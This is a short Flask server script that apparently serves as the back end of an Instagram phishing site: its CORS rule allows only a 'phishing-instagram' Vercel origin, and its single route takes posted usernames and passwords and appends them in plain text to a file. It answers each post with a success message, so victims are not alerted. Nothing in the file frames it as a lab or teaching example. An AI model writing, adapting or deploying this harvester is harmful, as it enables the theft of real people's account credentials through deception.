from flask import Flask, request, jsonify
from datetime import datetime
from flask_cors import CORS

app = Flask(__name__)

# Allowed origins — add your actual frontend URL(s) here
CORS(app, resources={r"/*": {"origins": [
    "https://phishing-instagram-liard.vercel.app",
]}})


@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        # Try to parse JSON (from your fetch). If not JSON, fall back to form data.
        data = request.get_json(silent=True)
        if data:
            username = data.get("username", "")
            password = data.get("password", "")
        else:
            username = request.form.get("username", "")
            password = request.form.get("password", "")

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Save credentials to file (append)
        try:
            with open("create.txt", "a", encoding="utf-8") as f:
                f.write(
                    f"Timestamp: {timestamp}\nUsername: {username}\nPassword: {password}\n{'='*50}\n"
                )
        except Exception as e:
            return jsonify({"status": "error", "message": "Failed to write file", "error": str(e)}), 500

        return jsonify({
            "status": "success",
            "message": "Login data received",
            "username": username
        }), 200

    # GET request: simple health/info response
    return jsonify({"status": "ok", "message": "POST username & password to this endpoint"}), 200


if __name__ == "__main__":
    app.run(debug=True, port=1111)




